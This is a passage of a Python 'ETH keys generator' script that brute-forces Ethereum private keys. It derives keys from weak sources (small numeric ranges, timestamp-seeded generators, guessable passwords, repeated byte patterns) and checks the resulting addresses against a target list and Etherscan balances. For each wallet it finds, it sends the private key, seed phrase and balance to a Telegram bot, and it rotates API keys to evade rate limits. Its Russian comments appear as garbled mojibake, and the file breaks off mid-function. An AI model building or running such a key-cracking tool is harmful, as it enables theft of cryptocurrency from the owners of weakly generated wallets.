import asyncio
import datetime
import json
import os
import random
import threading
import logging
import keyboard
import aiohttp
import aiofiles
import re
import configparser
import pyfiglet
import hashlib
import tqdm
from colorama import Fore, Style
from termcolor import colored
from web3 import Web3
from web3.exceptions import Web3Exception
from mnemonic import Mnemonic

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è —Å BOM –¥–ª—è Windows
logging.basicConfig(
    filename='eth_generator.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    encoding='utf-8',
    filemode='a'
)
logger = logging.getLogger(__name__)

# –î–æ–±–∞–≤–ª—è–µ–º BOM –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞
if not os.path.exists('eth_generator.log'):
    with open('eth_generator.log', 'wb') as f:
        f.write(b'\xEF\xBB\xBF')  # UTF-8 BOM

# –ó–∞–¥–µ—Ä–∂–∫–∏ –¥–ª—è API
API_REQUEST_INTERVAL = 0.05
MAX_API_TIMEOUT = 60
DAILY_LIMIT_TIMEOUT = 86400
MIN_RETRY_AFTER = 3600
MAX_RETRIES = 3
RETRY_BACKOFF = 2
PAUSE_COUNT_LIMIT = 3
PAUSE_WINDOW = 3600

# –ß—Ç–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
def load_config():
    if not os.path.exists('API.ini'):
        print(Fore.RED + "–û—à–∏–±–∫–∞: —Ñ–∞–π–ª API.ini –Ω–µ –Ω–∞–π–¥–µ–Ω." + Style.RESET_ALL)
        logger.error("–§–∞–π–ª API.ini –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        exit(1)
    config = configparser.ConfigParser()
    config.read('API.ini')
    if 'API' not in config:
        print(Fore.RED + "–û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞ API.ini." + Style.RESET_ALL)
        logger.error("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞ API.ini.")
        exit(1)
    
    infura_urls = [url.strip() for url in config['API'].get('INFURA_URL', '').split(',') if url.strip()]
    etherscan_keys = [key.strip() for key in config['API'].get('ETHERSCAN_API_KEY', '').split(',') if key.strip()]
    telegram_token = config['API'].get('TELEGRAM_BOT_TOKEN', '')
    telegram_chat_id = config['API'].get('TELEGRAM_CHAT_ID', '')
    
    for url in infura_urls:
        if not url.startswith('https://'):
            print(Fore.RED + f"–û—à–∏–±–∫–∞: INFURA_URL '{url}' –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å https://" + Style.RESET_ALL)
            logger.error(f"–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π INFURA_URL: {url}")
            exit(1)
    if not infura_urls or not etherscan_keys:
        print(Fore.RED + "–û—à–∏–±–∫–∞: INFURA_URL –∏–ª–∏ ETHERSCAN_API_KEY –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –≤ API.ini." + Style.RESET_ALL)
        logger.error("INFURA_URL –∏–ª–∏ ETHERSCAN_API_KEY –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –≤ API.ini.")
        exit(1)
    
    return infura_urls, etherscan_keys, telegram_token, telegram_chat_id

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è API_STATES –∏ API_ORDER
def initialize_api_states():
    global API_STATES, API_ORDER
    API_STATES.clear()
    API_ORDER.clear()
    for api_type, keys in API_KEYS.items():
        for idx, key in enumerate(keys):
            key_id = f"{api_type}_{idx}"
            API_STATES[key_id] = {
                'type': api_type,
                'key': key,
                'active': True,
                'limit_reached_time': None,
                'temp_pauses': [],
                'index': idx
            }
            API_ORDER.append(key_id)
    logger.info(f"–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ {len(API_STATES)} API –∫–ª—é—á–µ–π: {list(API_STATES.keys())}")

# –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
INFURA_URLS, ETHERSCAN_API_KEYS, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID = load_config()
API_STATES = {}
API_KEYS = {
    'infura': INFURA_URLS,
    'etherscan': ETHERSCAN_API_KEYS
}
API_ORDER = []
initialize_api_states()

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
API_STATES = {}  # –•—Ä–∞–Ω–∏—Ç —Å–æ—Å—Ç–æ—è–Ω–∏–µ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∫–ª—é—á–∞
API_KEYS = {
    'infura': INFURA_URLS,
    'etherscan': ETHERSCAN_API_KEYS
}
API_ORDER = []  # –ë—É–¥–µ—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è API
initialize_api_states()
web3 = None
connected = False
for url in INFURA_URLS:
    try:
        web3 = Web3(Web3.HTTPProvider(url))
        if web3.is_connected():
            logger.info(f"–£—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ Infura: {url}")
            print(Fore.GREEN + f"–ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ Infura: {url}" + Style.RESET_ALL)
            connected = True
            break
        else:
            logger.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ Infura URL: {url}")
            print(Fore.YELLOW + f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ Infura URL: {url}" + Style.RESET_ALL)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫ Infura URL {url}: {e}")
        print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫ Infura URL {url}: {e}" + Style.RESET_ALL)
if not connected:
    print(Fore.RED + "–û—à–∏–±–∫–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –ª—é–±–æ–º—É Infura URL. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ INFURA_URL –≤ API.ini." + Style.RESET_ALL)
    logger.error("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –ª—é–±–æ–º—É Infura URL.")
    exit(1)
    
# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∞—É–∑–æ–π –∏ —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å—é –∫–ª—é—á–µ–π
pause_event = asyncio.Event()  # –°–æ–±—ã—Ç–∏–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–∞—É–∑–æ–π
used_keys = set()  # –ú–Ω–æ–∂–µ—Å—Ç–≤–æ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –∫–ª—é—á–µ–π
used_keys_lock = asyncio.Lock()  # –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ used_keys
last_timestamp = int(datetime.datetime.now().timestamp())  # –ù–∞—á–∞–ª—å–Ω–∞—è –≤—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ—Å—Ç–æ—è–Ω–∏—è pause_event
pause_event.set()  # –ö–æ–¥ –Ω–∞—á–∏–Ω–∞–µ—Ç —Ä–∞–±–æ—Ç—É –±–µ–∑ –ø–∞—É–∑—ã
logger.info("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã –≥–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ: pause_event, used_keys, used_keys_lock, last_timestamp")

# ASCII-–∞—Ä—Ç
ascii_art = pyfiglet.figlet_format("ETH keys generator", font="standard")
colored_art = colored(ascii_art, 'cyan')
print(colored_art)
print(Fore.CYAN + "")
print()

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã
SUCCESS_FILE = 'successful_wallets.txt'
BALANCE_FILE = 'successful_wallets_balance.txt'
BAD_FILE = 'bad_wallets.txt'
STATE_FILE = 'state.json'
STATS_FILE = 'eth_generator.log'

GROUP_RANGES = {
    'A': (0x0000000000000000000000000000000000000000000000000000000000000001, 0x00000000000000000000000000000000000000000000000000000000FFFFFFFF),
    'B': (0x0000000000000000000000000000000000000000000000000000000100000000, 0x000000000000000000000000000000000000000000000000FFFFFFFF00000000),
    'C': (0x0000000000000000000000000000000000000000000000010000000000000000, 0x0000000000000000000000000000000000000000FFFFFFFF0000000000000000),
    'D': (0x0000000000000000000000000000000000000001000000000000000000000000, 0x00000000000000000000000000000000FFFFFFFF000000000000000000000000),
    'E': (0x0000000000000000000000000000000100000000000000000000000000000000, 0x000000000000000000000000FFFFFFFF00000000000000000000000000000000),
    'F': (0x0000000000000000000000010000000000000000000000000000000000000000, 0x0000000000000000FFFFFFFF0000000000000000000000000000000000000000),
    'G': (0x0000000000000001000000000000000000000000000000000000000000000000, 0x00000000FFFFFFFF000000000000000000000000000000000000000000000000),
    'H': (0x0000000100000000000000000000000000000000000000000000000000000000, 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000),
}

# –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
stats = {
    'keys_generated': 0,
    'matches_file': 0,
    'matches_api': 0,
    'addresses_with_balance': 0,
    'start_time': datetime.datetime.now(),
    'group_stats': {group: {'keys': 0, 'matches_file': 0, 'matches_api': 0} for group in GROUP_RANGES}
}

# –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
async def send_telegram_message(message, session, method=None, address=None, private_key=None, mnemonic_phrase=None, balance=None):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram —Ç–æ–∫–µ–Ω –∏–ª–∏ chat_id –Ω–µ —É–∫–∞–∑–∞–Ω—ã. –ü—Ä–æ–ø—É—Å–∫ –æ—Ç–ø—Ä–∞–≤–∫–∏.")
        return
    method_names = {
        1: "–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è",
        2: "Vanity-–∞–¥—Ä–µ—Å–∞",
        3: "–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–æ –≥—Ä—É–ø–ø–∞–º",
        4: "–ú–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∏–µ —Ñ—Ä–∞–∑—ã",
        5: "–£—è–∑–≤–∏–º—ã–µ –∫–ª—é—á–∏",
        6: "–ö–ª—é—á–∏ –ø–æ –≤—Ä–µ–º–µ–Ω–∏",
        7: "Mersenne Twister",
        8: "–ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü–∏—è",
        9: "–ö–ª—é—á–∏ –∏–∑ –ø–∞—Ä–æ–ª–µ–π",
        10: "MD5 —Ö—ç—à–∏",
        11: "Xorshift",
        12: "–£—Å–µ—á—ë–Ω–Ω—ã–µ —á–∏—Å–ª–∞"
    }
    formatted_message = f"**–ù–∞–π–¥–µ–Ω –∫–æ—à–µ–ª—ë–∫!** üîî\n"
    formatted_message += f"- **–ú–µ—Ç–æ–¥**: {method_names.get(method, '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π')}\n"
    formatted_message += f"- **–ê–¥—Ä–µ—Å**: `{address}`\n"
    formatted_message += f"- **–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á**: `{private_key}`\n"
    if mnemonic_phrase and method != 9:
        formatted_message += f"- **–ú–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∞—è —Ñ—Ä–∞–∑–∞**: `{mnemonic_phrase}`\n"
    elif mnemonic_phrase and method == 9:
        formatted_message += f"- **–ü–∞—Ä–æ–ª—å**: `{mnemonic_phrase}`\n"
    if balance is not None:
        formatted_message += f"- **–ë–∞–ª–∞–Ω—Å**: {balance} ETH\n"
    formatted_message += f"- **–í—Ä–µ–º—è**: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    formatted_message += f"\n{message}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": formatted_message,
        "parse_mode": "Markdown"
    }
    try:
        async with session.post(url, json=payload, timeout=10) as resp:
            response_text = await resp.text()
            logger.debug(f"Telegram API –æ—Ç–≤–µ—Ç: –∫–æ–¥ {resp.status}, {response_text}")
            if resp.status == 200:
                logger.info("–°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram")
            else:
                logger.error(f"–û—à–∏–±–∫–∞ Telegram API: –∫–æ–¥ {resp.status}, –æ—Ç–≤–µ—Ç: {response_text}")
                print(Fore.YELLOW + f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: –∫–æ–¥ {resp.status}" + Style.RESET_ALL)
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram: {e}")
        print(Fore.YELLOW + f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Telegram API: {e}" + Style.RESET_ALL)

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∞—É–∑–æ–π
def toggle_pause():
    if pause_event.is_set():
        pause_event.clear()
        print(Fore.CYAN + "–ö–æ–¥ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω." + Style.RESET_ALL)
        logger.info("–ö–æ–¥ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
    else:
        pause_event.set()
        print(Fore.CYAN + "–ö–æ–¥ –ø—Ä–æ–¥–æ–ª–∂–µ–Ω." + Style.RESET_ALL)
        logger.info("–ö–æ–¥ –ø—Ä–æ–¥–æ–ª–∂–µ–Ω.")

def listen_for_pause():
    keyboard.add_hotkey('page down', toggle_pause)
    keyboard.add_hotkey('page up', toggle_pause)

# –†–∞–±–æ—Ç–∞ —Å —Å–æ—Å—Ç–æ—è–Ω–∏–µ–º
def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r', encoding='utf-8') as f:
                state = json.load(f)
                start_index = state.get('start_index', 0)
                last_password_index = state.get('last_password_index', 0)
                logger.info(f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ —Å–æ—Å—Ç–æ—è–Ω–∏–µ: start_index={start_index}, last_password_index={last_password_index}")
                return {'start_index': start_index, 'last_password_index': last_password_index}
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ state.json: {e}")
    logger.info("–§–∞–π–ª —Å–æ—Å—Ç–æ—è–Ω–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ.")
    return {'start_index': 0, 'last_password_index': 0}

def save_state(start_index, last_password_index=0):
    state = {
        'start_index': start_index,
        'last_password_index': last_password_index
    }
    try:
        with open(STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(state, f)
        logger.info(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω–æ —Å–æ—Å—Ç–æ—è–Ω–∏–µ: start_index={start_index}, last_password_index={last_password_index}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ state.json: {e}")

# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
async def save_stats(method, check_mode, group=None):
    # –¶–∏–∫–ª–∏—á–µ—Å–∫–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è stats.txt
    if os.path.exists(STATS_FILE) and os.path.getsize(STATS_FILE) > 100 * 1024 * 1024:
        async with aiofiles.open(STATS_FILE, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
        keep_lines = lines[int(len(lines) * 0.5):]  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 50% —Å—Ç—Ä–æ–∫
        async with aiofiles.open(STATS_FILE, 'w', encoding='utf-8') as f:
            await f.writelines(keep_lines)
        logger.info(f"–§–∞–π–ª {STATS_FILE} –æ–±—Ä–µ–∑–∞–Ω —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏ (—É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏)")
        print(Fore.YELLOW + f"–§–∞–π–ª {STATS_FILE} –æ–±—Ä–µ–∑–∞–Ω: —É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏." + Style.RESET_ALL)
    
    elapsed_time = (datetime.datetime.now() - stats['start_time']).total_seconds()
    async with aiofiles.open(STATS_FILE, 'a', encoding='utf-8') as f:
        await f.write(f"Method: {method}, Mode: {check_mode}\n")
        await f.write(f"Keys generated: {stats['keys_generated']}\n")
        await f.write(f"Matches (file): {stats['matches_file']}\n")
        await f.write(f"Matches (API): {stats['matches_api']}\n")
        await f.write(f"Addresses with balance: {stats['addresses_with_balance']}\n")
        await f.write(f"Total time: {int(elapsed_time // 3600):02d}:{int((elapsed_time % 3600) // 60):02d}:{int(elapsed_time % 60):02d}\n")
        if method == 3 and group:
            group_data = stats['group_stats'][group]
            await f.write(f"Group {group}: Keys: {group_data['keys']}, Matches (file): {group_data['matches_file']}, Matches (API): {group_data['matches_api']}\n")
        await f.write("\n")
    logger.info(f"–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ {STATS_FILE}")

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
async def check_internet(session):
    try:
        async with session.get('https://etherscan.io/', timeout=20) as response:
            return response.status == 200
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False

# –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è —Ä–∞—Å—á—ë—Ç–∞ –≤—Ä–µ–º–µ–Ω–∏ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC
def time_until_midnight_utc():
    now = datetime.datetime.now(datetime.timezone.utc)
    midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
    seconds_until_midnight = (midnight - now).total_seconds()
    return max(seconds_until_midnight, 1)

# –û–∂–∏–¥–∞–Ω–∏–µ —Å–±—Ä–æ—Å–∞ –ª–∏–º–∏—Ç–æ–≤
async def wait_for_api_reset():
    now = datetime.datetime.now()
    reset_times = []
    for key_id, state in API_STATES.items():
        if state['limit_reached_time']:
            reset_times.append(state['limit_reached_time'])
        else:
            reset_times.append(now)
    if not reset_times:
        reset_times.append(now + datetime.timedelta(seconds=MAX_API_TIMEOUT))
    next_reset = min(reset_times)
    wait_time = max((next_reset - now).total_seconds(), 1)
    logger.debug(f"–û–∂–∏–¥–∞–Ω–∏–µ {wait_time} —Å–µ–∫—É–Ω–¥ –¥–æ –±–ª–∏–∂–∞–π—à–µ–≥–æ —Å–±—Ä–æ—Å–∞ API.")
    print(Fore.YELLOW + f"–í—Å–µ API –∫–ª—é—á–∏ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã. –û–∂–∏–¥–∞–Ω–∏–µ {wait_time:.1f} —Å–µ–∫—É–Ω–¥ –¥–æ {next_reset.strftime('%H:%M:%S')}..." + Style.RESET_ALL)
    await asyncio.sleep(wait_time)
    for key_id, state in API_STATES.items():
        if state['limit_reached_time'] and now >= state['limit_reached_time']:
            state['active'] = True
            state['limit_reached_time'] = None
            state['temp_pauses'] = []
            logger.info(f"–°–±—Ä–æ—Å –ª–∏–º–∏—Ç–∞ –¥–ª—è –∫–ª—é—á–∞ {key_id}.")

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –∫–ª—é—á–∞
def can_use_api(key_id):
    state = API_STATES[key_id]
    now = datetime.datetime.now()
    if state['limit_reached_time'] and now >= state['limit_reached_time']:
        state['active'] = True
        state['limit_reached_time'] = None
        state['temp_pauses'] = []
        logger.info(f"–ö–ª—é—á {key_id} –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ—Å–ª–µ –∏—Å—Ç–µ—á–µ–Ω–∏—è limit_reached_time.")
    logger.debug(f"–ö–ª—é—á {key_id} –∞–∫—Ç–∏–≤–µ–Ω: {state['active']}, –≤—Ä–µ–º—è —Å–±—Ä–æ—Å–∞: {state['limit_reached_time']}")
    return state['active']

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –ø–∞—É–∑
def check_temp_pauses(key_id):
    state = API_STATES[key_id]
    now = datetime.datetime.now()
    state['temp_pauses'] = [t for t in state['temp_pauses'] if (now - t).total_seconds() <= PAUSE_WINDOW]
    logger.debug(f"–ö–ª—é—á {key_id}: {len(state['temp_pauses'])} –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–∞—É–∑")
    if len(state['temp_pauses']) >= PAUSE_COUNT_LIMIT:
        wait_time = time_until_midnight_utc()
        state['active'] = False
        state['limit_reached_time'] = now + datetime.timedelta(seconds=wait_time)
        state['temp_pauses'] = []
        print(Fore.YELLOW + f"–ö–ª—é—á {key_id} –ø–æ–ª—É—á–∏–ª {PAUSE_COUNT_LIMIT} –ø–∞—É–∑—ã –∑–∞ —á–∞—Å. –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC..." + Style.RESET_ALL)
        logger.info(f"–ö–ª—é—á {key_id} –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫—É–Ω–¥")
        return True
    return False

# –°—Ä–∞–≤–Ω–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏
async def compare_address_with_file(address, addresses_set):
    if not addresses_set:
        logger.error("–ú–Ω–æ–∂–µ—Å—Ç–≤–æ addresses_set –ø—É—Å—Ç–æ–µ.")
        print(Fore.RED + "–û—à–∏–±–∫–∞: –º–Ω–æ–∂–µ—Å—Ç–≤–æ –∞–¥—Ä–µ—Å–æ–≤ –ø—É—Å—Ç–æ–µ." + Style.RESET_ALL)
        return False
    start_time = datetime.datetime.now()
    address_lower = address.lower()
    match = address_lower in addresses_set
    elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
    logger.debug(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–¥—Ä–µ—Å–∞ {address} –≤ –ø–∞–º—è—Ç–∏: {match}, {elapsed_time:.6f} —Å–µ–∫")
    if match:
        print(Fore.GREEN + f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ: {address}" + Style.RESET_ALL)
        logger.info(f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ: {address}")
    return match

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–µ–π
def generate_private_key():
    private_key = Web3.keccak(os.urandom(32)).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∫–ª—é—á: {private_key}")
    return private_key

def get_address_from_private_key(private_key):
    account = web3.eth.account.from_key(private_key)
    address = account.address
    logger.debug(f"–ü–æ–ª—É—á–µ–Ω –∞–¥—Ä–µ—Å {address} –∏–∑ –∫–ª—é—á–∞ {private_key}")
    return address

def is_valid_eth_address(address):
    valid = Web3.is_address(address)
    logger.debug(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–¥—Ä–µ—Å–∞ {address}: {'–≤–∞–ª–∏–¥–Ω—ã–π' if valid else '–Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π'}")
    return valid

def generate_mnemonic_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–æ–π —Ñ—Ä–∞–∑—ã —Å–æ —Å–ª–∞–±—ã–º RNG")
    a = 1664525
    c = 1013904223
    m = 2**32
    seed = int(datetime.datetime.now().timestamp()) % m
    random_bytes = bytearray()
    for _ in range(16):
        seed = (a * seed + c) % m
        random_bytes.append(seed & 0xFF)
    entropy = bytes(random_bytes)
    mnemo = Mnemonic("english")
    mnemonic_phrase = mnemo.to_mnemonic(entropy)
    seed = mnemo.to_seed(mnemonic_phrase)
    private_key = Web3.keccak(seed[:32]).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞ –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∞—è —Ñ—Ä–∞–∑–∞: {mnemonic_phrase}, –∫–ª—é—á: {private_key}")
    return private_key, mnemonic_phrase

def generate_password_key(password=None):
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–∞—Ä–æ–ª—è")
    if not password:
        password = f"password{random.randint(1, 1000000)}"
    private_key = Web3.keccak(text=password).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –∏–∑ –ø–∞—Ä–æ–ª—è '{password}': {private_key}")
    return private_key, password

def generate_vulnerable_combined_key(vulnerable_type):
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ–≥–æ –∫–ª—é—á–∞")
    if vulnerable_type == 1:
        patterns = [
            lambda: bytes([random.randint(0, 255)] * 32),
            lambda: (b'\xAA\xBB') * 16,
            lambda: (b'\x0F\xF0') * 16,
        ]
    elif vulnerable_type == 2:
        patterns = [
            lambda: b'\x00' * 28 + os.urandom(4),
            lambda: os.urandom(4) + b'\x00' * 28,
            lambda: b'\x00' * 12 + os.urandom(8) + b'\x00' * 12,
        ]
    elif vulnerable_type == 3:
        patterns = [
            lambda: bytes([i % 256 for i in range(32)]),
            lambda: bytes([random.choice([0x11, 0x22, 0x33, 0x44]) for _ in range(32)]),
            lambda: (b'\xDE\xAD\xBE\xEF') * 8,
        ]
    pattern = random.choice(patterns)()
    private_key = Web3.keccak(pattern).hex()
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω —É—è–∑–≤–∏–º—ã–π –∫–ª—é—á —Ç–∏–ø–∞ {vulnerable_type}: {private_key}")
    return private_key

def generate_timestamp_key():
    global last_timestamp
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—Ä–µ–º–µ–Ω–∏")
    if last_timestamp <= 0:
        logger.error("last_timestamp —Å—Ç–∞–ª –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º, —Å–±—Ä–æ—Å –Ω–∞ —Ç–µ–∫—É—â—É—é –≤—Ä–µ–º–µ–Ω–Ω—É—é –º–µ—Ç–∫—É")
        last_timestamp = int(datetime.datetime.now().timestamp())
    timestamp_bytes = last_timestamp.to_bytes(32, byteorder='big')
    private_key = Web3.keccak(timestamp_bytes).hex()
    last_timestamp -= 1
    logger.debug(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á –¥–ª—è –≤—Ä–µ–º–µ–Ω–∏ {last_timestamp}: {private_key}")
    return private_key

def generate_mersenne_key():
    logger.warning("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –∏–∑ Mersenne Twister")
    random.seed(int(datetime.datetime.now().timestamp()))
